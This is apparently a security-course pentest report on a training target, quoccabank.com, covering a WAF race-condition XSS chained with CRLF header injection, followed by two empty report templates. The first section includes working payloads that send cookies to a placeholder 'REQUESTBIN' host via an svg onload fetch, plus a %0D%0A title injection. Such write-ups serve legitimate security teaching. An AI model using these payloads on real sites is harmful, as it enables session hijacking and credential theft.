### CRITICAL - XSS through WAF bypass and CRLF vulnerability

**Asset Domain:** report.quoccabank.com

**Severity Classification:** CRITICAL

#### Vulnerability Details

This web application contains two vulnerabilities which can be chained to allow an attacker to steal the cookies of any user who visits the vulnerable page. The web application firewall (WAF) contains a race condition vulnerability which can be exploited so that some parts of the HTML are left unsanitised, exposing XSS in report content. Furthermore, report titles are vulnerable to Carriage Return Line Feed (CRLF) injections. This means that JavaScript is able to access HTTP-only cookies which would normally be unable to be accessed through JavaScript.

#### Proof of Concept / Steps to Reproduce

![report1](images/report1.png)

The robots.txt route indicates that there is a /view page for the website. Through experimentation, it can be discovered that the navigating to /view/{sessionID} allows one to view a submitted report, where the sessionID can be found through the cookie returned by the server upon sending a report. Sending a report with title and content `<b>test</b>` and viewing the rendered report, it can be seen, from the image above, that the report content is potentially vulnerable to reflected XSS, whilst the title seems to be appropriately HTML encoded. It seems that the WAF, which can be found in the report's source code, is able to strongly sanitise malicious tags and attributes, blocking a lot of malicious payloads. However, a vulnerability exists when trying to delete a malicious child element from the HTML content. The WAF iterates over the list of HTML child elements, calling the `sanitize()` function on each child within the loop, where unsafe child elements detected would be deleted from the list of child elements within the function. Due to list indexing, this means that the first element after an unsafe element will be skipped from the loop so they will remain unsantizied, leaving report viewers (such as admin) vulnerable to XSS attacks. As such, crafting the following payload for report content will allow for arbitrary code execution, since the script tag will get filtered out, but the svg tag will be left unsanitised:

```html
<script></script>
<svg onload=fetch('REQUESTBIN/?q='+document.cookie)/>
```

However, this isn't enough to steal a user's cookies since they are protected with HTTP-only. Examining the server response on accessing the report view page, it can be seen below that my report title "Title" can be found in the HTTP response header when viewing the report, under x-meta. 

![report2](images/report2.png)

HTTP response header splitting can be used to "push" the HTTP-only cookie found in the server response header into the HTML body. With the same report content, intercepting a sent report and adding two url-encoded carriage return characters (\r\n) `%0D%0A%0D%0A` to the end of the report's title using Burp Suite, it can be seen that some extra HTML text can be found at the top of the page, containing the cookie (below). 

![report3](images/report3.png)

Although HTTP-only cookies are unable to be accessed using JavaScript, we can use JavaScript to search for it using regular expressions and forward it to an attacker now that the cookie has been pushed into the HTML body. Combined with the Carriage Return Line Feed (CRLF) injection vulnerability in the title, the following payload for report content allows attackers to steal the cookies of any user who visits the XSS-vulnerable site. 

```html
<script></script>
<svg onload=fetch('REQUESTBIN/?q='+document.documentElement.outerText.match(/flag=(.*?);/)[1])/>
```

#### Impact

The vulnerability in the web application firewall enables arbitrary client side code execution through cross site scripting. The CRLF injection vulnerability allows HTTP-only cookies to be picked up by JavaScript, which can then be forwarded to an attacker. When visiting a compromised site, user cookies may be forwarded to an attacker who can impersonate them and access reports they submitted, since report sessionIDs are stored in cookies. 

#### Remediation

Regarding the WAF vulnerability, the most effective method of mitigating XSS is to disallow HTML user input in the first place, either HTML encoding user input or using a text parser if text formatting or image insertions are needed. Although using a `filter` function to sanitise children of the HTML report content, instead of removing elements whilst iterating over their containing array, would fix the WAF vulnerability, the safest way of sanitising user input would be to use popular trusted frameworks designed for HTML sanitisation, such as DOMPurify. These frameworks would most likely contain fewer vulnerabilities compared to writing a WAF yourself.

The CRLF injection vulnerability can also be remediated by being sanitised (stripping new line characters from title before sent as a HTTP header) or properly encoded in the HTTP response header output. However, if its inclusion in the X-Meta HTTP header is unnecessary, then it would be better to simply remove it from the header instead.

### CRITICAL - Profile Picture XSS

**Asset Domain:** profile.quoccabank.com

**Severity Classification:** CRITICAL

#### Vulnerability Details

#### Proof of Concept / Steps to Reproduce

#### Impact

#### Remediation







### CRITICAL - sturec

**Asset Domain:** sturec.quoccabank.com

**Severity Classification:** CRITICAL

#### Vulnerability Details

#### Proof of Concept / Steps to Reproduce

#### Impact

#### Remediation
